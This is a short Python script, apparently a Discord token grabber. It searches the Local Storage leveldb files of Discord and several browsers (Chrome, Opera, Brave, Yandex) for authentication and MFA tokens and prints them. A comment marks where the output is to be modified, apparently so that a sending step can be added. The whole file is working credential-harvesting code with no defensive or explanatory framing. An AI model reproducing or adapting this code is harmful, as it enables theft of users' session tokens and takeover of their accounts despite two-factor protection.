import os, re

roaming = os.getenv('APPDATA')
local   = os.getenv('LOCALAPPDATA')
DIRS = [
    roaming + '\\Discord',
    roaming + '\\discordcanary',
    roaming + '\\discordptb',
    local   + '\\Google\\Chrome\\User Data\\Default',
    roaming + '\\Opera Software\\Opera Stable',
    local   + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    local   + '\\Yandex\\YandexBrowser\\User Data\\Default'
]

TOKEN_REGEX_PATTERN = r'([a-zA-Z0-9-_]{24}\.[a-zA-Z0-9-_]{6}.[a-zA-Z0-9-_]{27})'
MFA_TOKEN_REGEX_PATTERN = r'mfa\.[\w-]{84}'

def getToken():
    _tokens = []
    _mfa_tokens = []
    for path_file in DIRS:
        path_file += '\\Local Storage\\leveldb\\000005.ldb'
        if os.path.isfile(path_file):
            with open(path_file, 'r', encoding='utf8', errors='ignore') as TOKEN_FILE:
                content = TOKEN_FILE.read()
                _tokens.extend(re.findall(TOKEN_REGEX_PATTERN, content))
                _mfa_tokens.extend(re.findall(MFA_TOKEN_REGEX_PATTERN, content))
    return _tokens, _mfa_tokens

#modify this here
tokens, mfa_tokens = getToken()
print('Tokens:\n' + '\n'.join(tokens))
print('\n')
print('MFA Tokens:\n' + '\n'.join(mfa_tokens))
input()